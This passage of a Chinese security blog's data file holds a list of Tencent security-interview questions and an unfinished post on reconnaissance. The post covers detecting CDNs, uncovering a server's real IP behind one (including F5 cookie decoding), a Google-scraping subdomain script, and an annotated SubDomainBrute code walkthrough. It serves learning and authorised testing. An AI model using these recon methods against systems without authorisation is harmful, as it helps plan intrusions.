title=\"2024-4-2\"></a>2024-4-2</h2><p>长亭oc</p>\n<h2 id=\"2024-11-19\"><a href=\"#2024-11-19\" class=\"headerlink\" title=\"2024-11-19\"></a>2024-11-19</h2><h3 id=\"腾讯一面\"><a href=\"#腾讯一面\" class=\"headerlink\" title=\"腾讯一面\"></a>腾讯一面</h3><p>lc4t学长的部门</p>\n<ul>\n<li>自我介绍</li>\n<li>介绍渗透测试思路</li>\n<li>指纹识别框架包含什么<ul>\n<li>关注哪些细节</li>\n<li>识别工具原理</li>\n</ul>\n</li>\n<li>常见备份文件或敏感目录以及用来做什么<ul>\n<li>自己的小技巧</li>\n</ul>\n</li>\n<li>其他信息收集需要关注的信息和资产</li>\n<li>详细介绍蜜罐做的哪部分环节和工作<ul>\n<li>要关注到哪几个方面？</li>\n<li>进入一台机器后怎么判断是不是蜜罐</li>\n</ul>\n</li>\n<li>防火墙设计</li>\n<li>护网蓝队主要工作</li>\n<li>sql注入原理（越深越好，越底层越好）<ul>\n<li>防御手段</li>\n<li>直接用预编译可以杜绝sql注入吗？</li>\n</ul>\n</li>\n<li>XSS和SQL注入相同点<ul>\n<li>挖掘XSS时候的测试思路</li>\n<li>如果用的vue和react的框架，如何挖掘XSS</li>\n<li>发现XSS以后，利用思路是什么</li>\n<li>反射型XSS利用时怎么不让别人发现</li>\n<li>写自己的JS的时候，有没有遇到防护手段，怎么绕过？</li>\n<li>HTTP与同源策略的限制</li>\n</ul>\n</li>\n<li>信息收集以后要干什么</li>\n<li>碰到什么样的漏洞要具体关注一下</li>\n<li>利用漏洞最终是想达成什么条件</li>\n<li>内网横向的一般步骤</li>\n<li>找到域控之类的怎么拿的<ul>\n<li>没找到咋办</li>\n</ul>\n</li>\n<li>除了渗透测试之外的安全方向</li>\n<li>WAF发展的模式分哪几种</li>\n<li>WAF和AI是否有结合的空间？要怎么处理呢<ul>\n<li>选择具体的算法和深度学习模型你选哪个</li>\n</ul>\n</li>\n<li>前沿一些的领域有了解吗</li>\n<li>怎么获取这些咨询的</li>\n<li>编程功底怎么样<ul>\n<li>有参加过开源项目吗</li>\n<li>列三个最常用的Python库</li>\n<li>Python3.7、3.6、3.8有什么区别</li>\n<li>出现多版本冲突怎么解决</li>\n</ul>\n</li>\n<li>dockerfile会写吗<ul>\n<li>用docker解决什么问题</li>\n<li>对有容器的系统来说，在安全上有什么额外的关注点</li>\n</ul>\n</li>\n<li>算法和数据结构有印象吗</li>\n<li>计网和计组呢<ul>\n<li>L3、L4、L7区别是什么</li>\n<li>DNS协议和TCP&#x2F;IP协议区别是啥？有什么联系</li>\n<li>手机点开微信到能加载消息加载成功，经过的网络协议有哪些</li>\n<li>ARM和x86有啥区别</li>\n<li>现代计算机的设计理念</li>\n</ul>\n</li>\n<li>用过AI工具吗？ChatGPT基本原理<ul>\n<li>类似LLM和NLP的区别和联系</li>\n</ul>\n</li>\n<li>怎么拆解leader或者导师安排的任务<ul>\n<li>如果因为沟通延迟等原因，无法交付怎么和leader沟通</li>\n</ul>\n</li>\n<li>反问</li>\n</ul>\n<p>被狠狠地拷打了，问题都问的比较深，真真切切体现出我的学习情况，对于漏洞都没有深挖，导致稍微问深一点就答不上了。还有就是面试能力太差，经常出现大脑一片空白。这次面试也是给了我一个警醒。</p>\n"},{"title":"信息收集(TODO)","hide":false,"abbrlink":56033,"date":"2025-03-03T15:25:57.000Z","_content":"\n\n\n# 信息收集\n\n> 信息收集是渗透测试中的第一步，也是最为关键的一步。有大佬说过：渗透测试的本质就是信息收集。因此在这里认真钻研一下信息收集部分，包括收集什么？如何收集？自动化工具的原理？也尽量自己在每个模块开发出自己的工具，最终整合成自己的信息收集工具。\n\n## 域名（Domain）\n\n> 域名是由一串用点分隔的字符组成的互联网上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位。域名是IP地址的代称，目的是便于记忆。一般渗透都会从一个域名开始，因此由域名开始作为切入口。\n\n### 判断CDN\n\n内容分发网络（Content Delivery Network）的基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输更快更稳定。那这对我们渗透测试带来了什么影响呢？\n\nCDN会代理客户端的请求，将真实服务器的IP地址隐藏，让我们无法直接定位目标服务器，因此需要绕过CDN。\n\n**ping域名判断是否有CDN**\n\n当ping出来的域名为很长一串字符，或者有着很明显的cdn、ali、tencent等字段时大概率存在CDN。\n\n![img](https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121133118.png)\n\n**nslookup判断CDN**\n\nnslookup是一个命令行工具，用于查询Internet域名信息或诊断DNS服务器问题。\n\n通过nslookup检测一个域名是否对应多个IP可以判断是否使用CDN\n\n![img](https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121133620.png)\n\n**多地ping判断CDN**\n\n[站长工具](https://ping.chinaz.com/)还是比较直观的\n\n![img](https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121133805.png)\n\n### 查看真实IP\n\n检测完CDN，就该绕过CDN检测了，获取真实IP\n\n**多地ping**\n\n不仅是检测CDN，同时也可以用来判断。\n\n如`www.youzan.com`，可以发现存在CDN，但是发现在除中国大陆外都是同一个IP，因此可以判断为真实IP\n\n![img](https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121134240.png)\n\n**子域名查询真实IP**\n\nCDN并非免费的，成本较大，因此很多公司可能只对主站或者访问量较大的站做了CDN加速。因此可以通过获取子域名来查询真实IP，查询方式可以利用上述多地ping方法。子域名收集在后面单独讲。\n\n**DNS历史记录**\n\n查看IP与域名绑定的历史记录，可能存在使用CDN前的解析记录，[Viewdns](https://viewdns.info/)或者之前的开发工具都可以查询\n\n**SSL证书**\n\n加入web服务器支持SSL并具有证书，在端口443直接访问时，SSL证书就会被暴露。此时攻击者会看见一个使用特定证书的IPv4主机列表，真实IP就在其中。\n\n**漏洞查找**\n\n- 敏感文件泄露，如phpinfo等，github信息泄露等。\n- XSS、命令执行、SSRF等。\n- 社工等手段，拿到目标管理员在CDN账号，可以在CDN配置找到。\n\n**网站邮件**\n\n很多网站都自带`sendmail`，会发邮件给我们，此时查看邮件源码里面就会包含服务器的真实IP\n\n**F5 LTM解码**\n\n当服务器使用FT5 LTM做负载均衡的时候，对set-cookie关键字解码也可以获取真实IP\n\n```\nSet-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000\n先把第一小节的十进制数取出来：487098378\n再转化为十六进制数：1d08880a\n从后至前取四位数：0a.88.08.1d\n转化为十进制即为IP：10.136.8.29\n```\n\n### 子域名收集\n\n在前面查看真实IP的地方提到了子域名收集，子域名收集不只是为了找真实IP服务，更是为了扩大资产收集范围。\n\n**搜索引擎收集**\n\n使用谷歌语法等可以收集大量信息，如`site:domain`\n\n![img](https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121143338.png)\n\n尝试自己写了个基于Chrome搜索的脚本，爬取效果还是不错的，后面看看能不能增加功能\n\n```python\nimport argparse\nimport re\nimport signal\nimport sys\n\nfrom selenium import webdriver\nfrom selenium.webdriver.common.by import By\n\n\n# write to file\ndef write_file(file_path, content):\n    try:\n        with open(file_path, 'a', encoding='utf-8') as file:\n            file.write(content + '\\n')\n        return True\n    except Exception as e:\n        print(e)\n        return False\n\n\n# signal handler\ndef signal_handler(sig, frame):\n    print(\"\\nuser pause\")\n    sys.exit(0)\n\n\n# init selenium\ndef setup_driver():\n    options = webdriver.ChromeOptions()\n    options.add_argument(\"--headless\")\n    return webdriver.Chrome(options=options)\n\n\n# get domain in links\ndef extract_domain(link):\n    match = re.search(r\"https://(.*?)/\", link)\n    if match:\n        return match.group(1)\n    return None\n\n\n# fetch links from result\ndef fetch_links(driver, domain, page):\n    url = f\"https://www.google.com/search?q=site:{domain}&start={page}0\"\n    driver.get(url)\n\n    try:\n        elements = driver.find_elements(By.CSS_SELECTOR, \"#rso .kb0PBd.A9Y9g.jGGQ5e span > a\")\n        links = []\n        for element in elements:\n            link = element.get_attribute(\"href\")\n            if link:\n                links.append(link)\n        return links\n    except Exception as e:\n        print(f\"failed to fetch links: {e}\")\n        return []\n\n\n# main\ndef main():\n    # signal init\n    signal.signal(signal.SIGINT, signal_handler)\n\n    # parse user input\n    parser = argparse.ArgumentParser(description=\"Chrome search script\")\n    parser.add_argument(\"-d\", \"--domain\", required=True, help=\"The domain to search\")\n    parser.add_argument(\"-m\", \"--maxpage\", type=int, required=True, help=\"The maximum number to search\")\n    args = parser.parse_args()\n\n    # parameter assignment\n    domain = args.domain\n    max_page = args.maxpage\n\n    # init driver\n    driver = setup_driver()\n\n    # remove duplicates\n    unique_links = set()\n\n    # Start crawling from the first page\n    for page in range(0, max_page + 1):\n        links = fetch_links(driver, domain, page)\n\n        # Traverse links, extract and save unique domain names\n        for link in links:\n            domain_name = extract_domain(link)\n            if domain_name and domain_name not in unique_links:\n                unique_links.add(domain_name)\n                print(domain_name)\n                write_file(\"domain.txt\", domain_name)\n\n    # close driver\n    driver.quit()\n\n\nif __name__ == \"__main__\":\n    main()\n```\n\n**资产测绘工具搜集**\n\n使用资产测绘工具收集，如**fofa、hunter、360quake、微步**等，包括使用站长之家等等。\n\n![img](https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241122163631.png)\n\n**使用自动化工具**\n\n这里对两种开源的工具进行源码分析，了解其原理\n\n#### **SubDomainBrute源码分析**\n\n这里只分析主要代码\n\n```python\n# 加载DNS服务器地址\ndef load_dns_servers():\n    print_msg('[+] Validate DNS servers', line_feed=True)\n    dns_servers = []\n\n    servers_to_test = []\n    # 从字典中加载未被注释的DNS服务器地址\n    for server in open(os.path.join(root_path, 'dict/dns_servers.txt')).readlines():\n        server = server.strip()\n        if server and not server.startswith('#'):\n            servers_to_test.append(server)\n\n\t# 异步验证DNS服务器，dns_servers为传入的空列表，保存验证通过的DNS服务器地址\n    loop = asyncio.get_event_loop()\n    loop.run_until_complete(async_load_dns_servers(servers_to_test, dns_servers))\n\n    # 打印有效DNS服务器地址\n    server_count = len(dns_servers)\n    print_msg('\\n[+] %s DNS Servers found' % server_count, line_feed=True)\n    if server_count == 0:\n        print_msg('[ERROR] No valid DNS Server !', line_feed=True)\n        sys.exit(-1)\n    return dns_servers\n\n# 加载子域名爆破字典\ndef load_next_sub(full_scan):\n    next_subs = []\n    # 根据full_scan参数判断加载哪个字典\n    _file = 'dict/next_sub_full.txt' if full_scan else 'dict/next_sub.txt'\n    \n    # 将子域名去重后存入临时集合tmp_set\n    with open(os.path.join(root_path, _file)) as f:\n        for line in f:\n            sub = line.strip()\n            if sub and sub not in next_subs:\n                tmp_set = {sub}\n                \n                # 如果子域名模块包含占位符，如{alphnum}，则进行替换操作\n                while tmp_set:\n                    item = tmp_set.pop()\n                    if item.find('{alphnum}') >= 0:\n                        for _letter in 'abcdefghijklmnopqrstuvwxyz0123456789':\n                            tmp_set.add(item.replace('{alphnum}', _letter, 1))\n                    elif item.find('{alpha}') >= 0:\n                        for _letter in 'abcdefghijklmnopqrstuvwxyz':\n                            tmp_set.add(item.replace('{alpha}', _letter, 1))\n                    elif item.find('{num}') >= 0:\n                        for _letter in '0123456789':\n                            tmp_set.add(item.replace('{num}', _letter, 1))\n                    elif item not in next_subs:\n                        next_subs.append(item)\n    return next_subs\n```\n\n加载字典的功能中，使用占位符的方式让这个工具更加灵活，字典文件更加通用，并且通过这个方式可以轻松生成大规模的子域名。\n\n在子域名中还存在一个**泛解析**的问题，这个工具里面解决了这个问题\n\n```python\nasync def async_wildcard_test(domain, dns_servers, level=1):\n    try:\n        # 创建异步DNS解析器\n        r = dns.asyncresolver.Resolver()\n        # 使用DNS服务器解析域名\n        r.nameservers = dns_servers\n        # 使用异步DNS查询解析A记录，lijiejie-not-existed-test是一个随机的子域名，理论上不存在\n        answers = await r.resolve('lijiejie-not-existed-test.%s' % domain, 'A', lifetime=10)\n        # 如果解析成功，讲这些IP手机在ips中，如果解析的IP有效，可能意味着域名启用了通配符解析\n        ips = ', '.join(sorted([answer.address for answer in answers]))\n        # 初步检测，生成一个子域名，并递归调用进一步检测，并将level设置为2\n        if level == 1:\n            print('any-sub.%s\\t%s' % (domain.ljust(30), ips))\n            await async_wildcard_test('any-sub.%s' % domain, dns_servers, 2)\n        # 打印提示信息，使用-w参数强制扫描通配符域名\n        elif level == 2:\n            print('\\nUse -w to enable force scan wildcard domain')\n            sys.exit(0)\n    except Exception as e:\n        return domain\n\ndef wildcard_test(domain, dns_servers):\n    # 获取当前的异步事件循环\n    loop = asyncio.get_event_loop()\n    # 等待异步任务完成\n    return loop.run_until_complete(\n        # 并行执行多个异步任务，并返回它们的结果\n        asyncio.gather(\n            async_wildcard_test(domain, dns_servers, level=1)\n        )\n    )[0]\n```\n\n通过给出一个不存在的域名检测，判断是否开启了泛解析\n\n接下来看看扫描模块\n\n```python\n# 爆破模块\nclass SubNameBrute(object):\n    # 初始化\n    def __init__(self, *params):\n        # 提取传入参数\n        self.domain, self.options, self.process_num, self.dns_servers, self.next_subs, \\\n            self.scan_count, self.found_count, self.queue_size_array, tmp_dir = params\n        self.dns_count = len(self.dns_servers)\n        self.scan_count_local = 0\n        self.found_count_local = 0\n        # 初始化DNS解析器\n        self.resolvers = [dns.asyncresolver.Resolver(configure=False) for _ in range(self.options.threads)]\n        for r in self.resolvers:\n            # 解析事件\n            r.lifetime = 6.0\n            # 超时时间\n            r.timeout = 10.0\n        # 优先队列和状态变量\n        self.queue = PriorityQueue()\n        self.ip_dict = {}\n        self.found_subs = set()\n        self.cert_subs = set()\n        self.timeout_subs = {}\n        self.no_server_subs = {}\n        self.count_time = time.time()\n        # 输出日志到文件\n        self.outfile = open('%s/%s_part_%s.txt' % (tmp_dir, self.domain, self.process_num), 'w')\n        self.normal_names_set = set()\n        self.lock = asyncio.Lock()\n        # 线程状态\n        self.threads_status = ['1'] * self.options.threads\n\n    # 加载子域名字典\n    async def load_sub_names(self):\n        normal_lines = []\n        wildcard_lines = []\n        wildcard_set = set()\n        regex_list = []\n        lines = set()\n        # 打开文件逐行读取子域名，跳过空行或重复子域名\n        with open(self.options.file) as inFile:\n            for line in inFile.readlines():\n                sub = line.strip()\n                if not sub or sub in lines:\n                    continue\n                lines.add(sub)\n\n                # 判断子域名是否含占位符\n                brace_count = sub.count('{')\n                if brace_count > 0:\n                    wildcard_lines.append((brace_count, sub))\n\t\t\t\t\t# 占位符处理\n                    sub = sub.replace('{alphnum}', '[a-z0-9]')\n                    sub = sub.replace('{alpha}', '[a-z]')\n                    sub = sub.replace('{num}', '[0-9]')\n                    # 去重\n                    if sub not in wildcard_set:\n                        wildcard_set.add(sub)\n                        regex_list.append('^' + sub + '$')\n                else:\n                    # 普通子域名直接加入列表\n                    normal_lines.append(sub)\n                    self.normal_names_set.add(sub)\n\n        if regex_list:\n            pattern = '|'.join(regex_list)\n            _regex = re.compile(pattern)\n            for line in normal_lines:\n                if _regex.search(line):\n                    normal_lines.remove(line)\n\t\t\n        # 普通子域名加入队列，优先级为0\n        for _ in normal_lines[self.process_num::self.options.process]:\n            await self.queue.put((0, _))    # priority set to 0\n        \n        # 含占位符的子域名直接加入队列\n        for _ in wildcard_lines[self.process_num::self.options.process]:\n            await self.queue.put(_)\n\n    # 检测进程状态\n    async def update_counter(self):\n        while True:\n            if '1' not in self.threads_status:\n                return\n            self.scan_count.value += self.scan_count_local\n            self.scan_count_local = 0\n            self.queue_size_array[self.process_num] = self.queue.qsize()\n            if self.found_count_local:\n                self.found_count.value += self.found_count_local\n                self.found_count_local = 0\n            self.count_time = time.time()\n            await asyncio.sleep(0.5)\n\n    # 检测目标域名的SSL/TLS证书的扩展信息，提取符合条件的子域名\n    async def check_https_alt_names(self, domain):\n        try:\n            # 建立异步HTTPS连接\n            reader, _ = await asyncio.open_connection(\n                host=domain,\n                port=443,\n                ssl=True,\n                server_hostname=domain,\n            )\n            # 获取证书详细信息\n            for item in reader._transport.get_extra_info('peercert')['subjectAltName']:\n                if item[0].upper() == 'DNS':\n                    name = item[1].lower()\n                    # 筛选符合条件的子域名\n                    if name.endswith(self.domain):\n                        sub = name[:len(name) - len(self.domain) - 1]    # new sub\n                        sub = sub.replace('*', '')\n                        sub = sub.strip('.')\n                        # 去重并添加到任务队列\n                        if sub and sub not in self.found_subs and \\\n                                sub not in self.normal_names_set and sub not in self.cert_subs:\n                            self.cert_subs.add(sub)\n                            await self.queue.put((0, sub))\n        except Exception as e:\n            pass\n\n\n    # 查询DNS解析结果，并限制查询的超时时间\n    async def do_query(self, j, cur_domain):\n        async with timeout(10.2):\n            return await self.resolvers[j].resolve(cur_domain, 'A')\n\n    # 扫描\n    async def scan(self, j):\n        # 设置DNS解析器\n        self.resolvers[j].nameservers = [self.dns_servers[j % self.dns_count]]\n        if self.dns_count > 1:\n            while True:\n                s = random.choice(self.dns_servers)\n                if s != self.dns_servers[j % self.dns_count]:\n                    self.resolvers[j].nameservers.append(s)\n                    break\n        empty_counter = 0\n        \n        # 处理子域\n        while True:\n            try:\n                brace_count, sub = self.queue.get_nowait()\n                self.threads_status[j] = '1'\n                empty_counter = 0\n            except asyncio.queues.QueueEmpty as e:\n                empty_counter += 1\n                if empty_counter > 10:\n                    self.threads_status[j] = '0'\n                if '1' not in self.threads_status:\n                    break\n                else:\n                    await asyncio.sleep(0.1)\n                    continue\n\n            # 对于带有通配符的子域进行处理\n            if brace_count > 0:\n                brace_count -= 1\n                if sub.find('{next_sub}') >= 0:\n                    for _ in self.next_subs:\n                        await self.queue.put((0, sub.replace('{next_sub}', _)))\n                if sub.find('{alphnum}') >= 0:\n                    for _ in 'abcdefghijklmnopqrstuvwxyz0123456789':\n                        await self.queue.put((brace_count, sub.replace('{alphnum}', _, 1)))\n                elif sub.find('{alpha}') >= 0:\n                    for _ in 'abcdefghijklmnopqrstuvwxyz':\n                        await self.queue.put((brace_count, sub.replace('{alpha}', _, 1)))\n                elif sub.find('{num}') >= 0:\n                    for _ in '0123456789':\n                        await self.queue.put((brace_count, sub.replace('{num}', _, 1)))\n                continue\n\n            try:\n                if sub in self.found_subs:\n                    continue\n\n                self.scan_count_local += 1\n                cur_domain = sub + '.' + self.domain\n\n                # 执行DNS查询\n                answers = await self.do_query(j, cur_domain)\n                \n                # 处理DNS查询结果，排除无效IP\n                if answers:\n                    self.found_subs.add(sub)\n                    ips = ', '.join(sorted([answer.address for answer in answers]))\n                    invalid_ip_found = False\n                    for answer in answers:\n                        if answer.address in ['1.1.1.1', '127.0.0.1', '0.0.0.0', '0.0.0.1']:\n                            invalid_ip_found = True\n                    if invalid_ip_found:\n                        continue\n                    if self.options.i and is_intranet(answers[0].host):\n                        continue\n\n                    try:\n                        # 查询CNAME记录\n                        cname = str(answers.canonical_name)[:-1]\n                        if cname != cur_domain and cname.endswith(self.domain):\n                            cname_sub = cname[:len(cname) - len(self.domain) - 1]    # new sub\n                            if cname_sub not in self.found_subs and cname_sub not in self.normal_names_set:\n                                await self.queue.put((0, cname_sub))\n                    except Exception as e:\n                        pass\n\n                    first_level_sub = sub.split('.')[-1]\n                    max_found = 20\n\n                    if self.options.w:\n                        first_level_sub = ''\n                        max_found = 3\n\n                    if (first_level_sub, ips) not in self.ip_dict:\n                        self.ip_dict[(first_level_sub, ips)] = 1\n                    else:\n                        self.ip_dict[(first_level_sub, ips)] += 1\n                        if self.ip_dict[(first_level_sub, ips)] > max_found:\n                            continue\n\n                    self.found_count_local += 1\n\n                    # 将查询结果写入文件\n                    self.outfile.write(cur_domain.ljust(30) + '\\t' + ips + '\\n')\n                    self.outfile.flush()\n\n                    # 检查HTTPS证书\n                    if not self.options.no_cert_check:\n                        async with timeout(10.0):\n                            await self.check_https_alt_names(cur_domain)\n\n                    try:\n                        self.scan_count_local += 1\n                        await self.do_query(j, 'lijiejie-test-not-existed.' + cur_domain)\n\n                    except dns.resolver.NXDOMAIN as e:\n                        if self.queue.qsize() < 20000:\n                            for _ in self.next_subs:\n                                await self.queue.put((0, _ + '.' + sub))\n                        else:\n                            await self.queue.put((1, '{next_sub}.' + sub))\n                    except Exception as e:\n                        continue\n\n            except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer) as e:\n                pass\n            except dns.resolver.NoNameservers as e:\n                self.no_server_subs[sub] = self.no_server_subs.get(sub, 0) + 1\n                if self.no_server_subs[sub] <= 3:\n                    await self.queue.put((0, sub))    # Retry again\n            except (dns.exception.Timeout, dns.resolver.LifetimeTimeout) as e:\n                self.timeout_subs[sub] = self.timeout_subs.get(sub, 0) + 1\n                if self.timeout_subs[sub] <= 3:\n                    await self.queue.put((0, sub))    # Retry again\n            except Exception as e:\n                if str(type(e)).find('asyncio.exceptions.TimeoutError') < 0:\n                    with open('errors.log', 'a') as errFile:\n                        errFile.write('[%s] %s\\n' % (type(e), str(e)))\n\n    async def async_run(self):\n        await self.load_sub_names()\n        tasks = [self.scan(i) for i in range(self.options.threads)]\n        tasks.insert(0, self.update_counter())\n        await asyncio.gather(*tasks)\n\n    def run(self):\n        loop = asyncio.get_event_loop()\n        asyncio.set_event_loop(loop)\n        loop.run_until_complete(self.async_run())\n\ndef run_process(*params):\n    # 信号处理器\n    signal.signal(signal.SIGINT, user_abort)\n    # 调用SubNameBrute的run方法\n    s = SubNameBrute(*params)\n    s.run()\n\n# 根据option.process启动多个进程\nfor process_num in range(options.process):\n    p = multiprocessing.Process(\n        # 调用run_process进行扫描\n        target=run_process,\n        args=(domain, options, process_num, dns_servers, next_subs,\n              scan_count, found_count, queue_size_array, tmp_dir)\n    )\n    all_process.append(p)\n    p.start()\n```\n\n总体的工作路径为：\n\n- **加载子域名**：从文件中读取子域名，识别通配符，放入任务队列\n- 扫描子域\n  - 多线程扫描子域\n  - 对每个子域执行DNS查询，处理返回结果\n  - 对子域名进行证书检查，CNAME解析等附加操作\n- **记录结果**\n- **错误处理与重试**：对于DNS查询失败的子域进行重试，最多三次\n\n这里有个证书检查和CNAME解析，还有一个称呼叫**证书透明度**主要原因是**提高全面性**。在**SSL/TLS**证书中的`subjectAltName`字段会暴露一些隐藏子域。**CNAME**是DNS中的一种记录类别，通常用于将一个域名指向另一个域名，也就是说CNAME可以为某个域名创建一个别名，因此可以去发现隐藏的域名，增加子域名查询的全面性。\n\n**对于通配符子域名的处理**：讲这些子域存在一个集合中，避免重复爆破，根据查询CNAME和MX记录，挖掘更多的子域，并且进行递归查询。\n","source":"_posts/信息收集(TODO).md","raw":"---\ntitle: 信息收集(TODO)\ntags:\n  - 网络安全\nhide: false\nabbrlink: 56033\ndate: 2025-03-03 23:25:57\n---\n\n\n\n# 信息收集\n\n> 信息收集是渗透测试中的第一步，也是最为关键的一步。有大佬说过：渗透测试的本质就是信息收集。因此在这里认真钻研一下信息收集部分，包括收集什么？如何收集？自动化工具的原理？也尽量自己在每个模块开发出自己的工具，最终整合成自己的信息收集工具。\n\n## 域名（Domain）\n\n> 域名是由一串用点分隔的字符组成的互联网上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位。域名是IP地址的代称，目的是便于记忆。一般渗透都会从一个域名开始，因此由域名开始作为切入口。\n\n### 判断CDN\n\n内容分发网络（Content Delivery Network）的基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输更快更稳定。那这对我们渗透测试带来了什么影响呢？\n\nCDN会代理客户端的请求，将真实服务器的IP地址隐藏，让我们无法直接定位目标服务器，因此需要绕过CDN。\n\n**ping域名判断是否有CDN**\n\n当ping出来的域名为很长一串字符，或者有着很明显的cdn、ali、tencent等字段时大概率存在CDN。\n\n![img](https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121133118.png)\n\n**nslookup判断CDN**\n\nnslookup是一个命令行工具，用于查询Internet域名信息或诊断DNS服务器问题。\n\n通过nslookup检测一个域名是否对应多个IP可以判断是否使用CDN\n\n![img](https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121133620.png)\n\n**多地ping判断CDN**\n\n[站长工具](https://ping.chinaz.com/)还是比较直观的\n\n![img](https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121133805.png)\n\n### 查看真实IP\n\n检测完CDN，就该绕过CDN检测了，获取真实IP\n\n**多地ping**\n\n不仅是检测CDN，同时也可以用来判断。\n\n如`www.youzan.com`，可以发现存在CDN，但是发现在除中国大陆外都是同一个IP，因此可以判断为真实IP\n\n![img](https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121134240.png)\n\n**子域名查询真实IP**\n\nCDN并非免费的，成本较大，因此很多公司可能只对主站或者访问量较大的站做了CDN加速。因此可以通过获取子域名来查询真实IP，查询方式可以利用上述多地ping方法。子域名收集在后面单独讲。\n\n**DNS历史记录**\n\n查看IP与域名绑定的历史记录，可能存在使用CDN前的解析记录，[Viewdns](https://viewdns.info/)或者之前的开发工具都可以查询\n\n**SSL证书**\n\n加入web服务器支持SSL并具有证书，在端口443直接访问时，SSL证书就会被暴露。此时攻击者会看见一个使用特定证书的IPv4主机列表，真实IP就在其中。\n\n**漏洞查找**\n\n- 敏感文件泄露，如phpinfo等，github信息泄露等。\n- XSS、命令执行、SSRF等。\n- 社工等手段，拿到目标管理员在CDN账号，可以在CDN配置找到。\n\n**网站邮件**\n\n很多网站都自带`sendmail`，会发邮件给我们，此时查看邮件源码里面就会包含服务器的真实IP\n\n**F5 LTM解码**\n\n当服务器使用FT5 LTM做负载均衡的时候，对set-cookie关键字解码也可以获取真实IP\n\n```\nSet-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000\n先把第一小节的十进制数取出来：487098378\n再转化为十六进制数：1d08880a\n从后至前取四位数：0a.88.08.1d\n转化为十进制即为IP：10.136.8.29\n```\n\n### 子域名收集\n\n在前面查看真实IP的地方提到了子域名收集，子域名收集不只是为了找真实IP服务，更是为了扩大资产收集范围。\n\n**搜索引擎收集**\n\n使用谷歌语法等可以收集大量信息，如`site:domain`\n\n![img](https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121143338.png)\n\n尝试自己写了个基于Chrome搜索的脚本，爬取效果还是不错的，后面看看能不能增加功能\n\n```python\nimport argparse\nimport re\nimport signal\nimport sys\n\nfrom selenium import webdriver\nfrom selenium.webdriver.common.by import By\n\n\n# write to file\ndef write_file(file_path, content):\n    try:\n        with open(file_path, 'a', encoding='utf-8') as file:\n            file.write(content + '\\n')\n        return True\n    except Exception as e:\n        print(e)\n        return False\n\n\n# signal handler\ndef signal_handler(sig, frame):\n    print(\"\\nuser pause\")\n    sys.exit(0)\n\n\n# init selenium\ndef setup_driver():\n    options = webdriver.ChromeOptions()\n    options.add_argument(\"--headless\")\n    return webdriver.Chrome(options=options)\n\n\n# get domain in links\ndef extract_domain(link):\n    match = re.search(r\"https://(.*?)/\", link)\n    if match:\n        return match.group(1)\n    return None\n\n\n# fetch links from result\ndef fetch_links(driver, domain, page):\n    url = f\"https://www.google.com/search?q=site:{domain}&start={page}0\"\n    driver.get(url)\n\n    try:\n        elements = driver.find_elements(By.CSS_SELECTOR, \"#rso .kb0PBd.A9Y9g.jGGQ5e span > a\")\n        links = []\n        for element in elements:\n            link = element.get_attribute(\"href\")\n            if link:\n                links.append(link)\n        return links\n    except Exception as e:\n        print(f\"failed to fetch links: {e}\")\n        return []\n\n\n# main\ndef main():\n    # signal init\n    signal.signal(signal.SIGINT, signal_handler)\n\n    # parse user input\n    parser = argparse.ArgumentParser(description=\"Chrome search script\")\n    parser.add_argument(\"-d\", \"--domain\", required=True, help=\"The domain to search\")\n    parser.add_argument(\"-m\", \"--maxpage\", type=int, required=True, help=\"The maximum number to search\")\n    args = parser.parse_args()\n\n    # parameter assignment\n    domain = args.domain\n    max_page = args.maxpage\n\n    # init driver\n    driver = setup_driver()\n\n    # remove duplicates\n    unique_links = set()\n\n    # Start crawling from the first page\n    for page in range(0, max_page + 1):\n        links = fetch_links(driver, domain, page)\n\n        # Traverse links, extract and save unique domain names\n        for link in links:\n            domain_name = extract_domain(link)\n            if domain_name and domain_name not in unique_links:\n                unique_links.add(domain_name)\n                print(domain_name)\n                write_file(\"domain.txt\", domain_name)\n\n    # close driver\n    driver.quit()\n\n\nif __name__ == \"__main__\":\n    main()\n```\n\n**资产测绘工具搜集**\n\n使用资产测绘工具收集，如**fofa、hunter、360quake、微步**等，包括使用站长之家等等。\n\n![img](https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241122163631.png)\n\n**使用自动化工具**\n\n这里对两种开源的工具进行源码分析，了解其原理\n\n#### **SubDomainBrute源码分析**\n\n这里只分析主要代码\n\n```python\n# 加载DNS服务器地址\ndef load_dns_servers():\n    print_msg('[+] Validate DNS servers', line_feed=True)\n    dns_servers = []\n\n    servers_to_test = []\n    # 从字典中加载未被注释的DNS服务器地址\n    for server in open(os.path.join(root_path, 'dict/dns_servers.txt')).readlines():\n        server = server.strip()\n        if server and not server.startswith('#'):\n            servers_to_test.append(server)\n\n\t# 异步验证DNS服务器，dns_servers为传入的空列表，保存验证通过的DNS服务器地址\n    loop = asyncio.get_event_loop()\n    loop.run_until_complete(async_load_dns_servers(servers_to_test, dns_servers))\n\n    # 打印有效DNS服务器地址\n    server_count = len(dns_servers)\n    print_msg('\\n[+] %s DNS Servers found' % server_count, line_feed=True)\n    if server_count == 0:\n        print_msg('[ERROR] No valid DNS Server !', line_feed=True)\n        sys.exit(-1)\n    return dns_servers\n\n# 加载子域名爆破字典\ndef load_next_sub(full_scan):\n    next_subs = []\n    # 根据full_scan参数判断加载哪个字典\n    _file = 'dict/next_sub_full.txt' if full_scan else 'dict/next_sub.txt'\n    \n    # 将子域名去重后存入临时集合tmp_set\n    with open(os.path.join(root_path, _file)) as f:\n        for line in f:\n            